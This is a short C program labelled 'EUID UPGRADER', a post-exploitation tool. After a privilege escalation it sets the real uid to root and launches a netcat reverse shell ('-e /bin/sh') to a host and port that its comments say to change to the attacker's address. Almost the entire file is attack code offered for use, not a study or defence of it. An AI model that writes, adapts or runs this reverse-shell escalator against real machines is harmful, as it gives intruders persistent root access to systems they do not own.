#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

//--> EUID UPGRADER <--\\
//Upon successful privilege escalation, when running id, you may notice the following output:
//$id
//uid=1000(User) gid=1000(User) ->euid=0(root)<- groups=1000(User)
//If euid is higher than your current user, you can create a higher privileged netcat session.
//Prerequisites:
//change `location` to the installation location of netcat (default is /bin/netcat)
//change `ip` to the attacker's ip address
//change `port` to the attacker's listening port
//Optional:
//change `command` to the command you want to run 

char location[] = "/usr/bin/netcat";
char ip[] = "localhost";
char port[] = "80";
char command[] = "/bin/sh";


int main(void) {
 setreuid(0, 0);
 //system(("%s %s %s -e %s", location, ip, port, command));
 system("/usr/bin/netcat localhost 80 -e /bin/sh");
 return 0;
}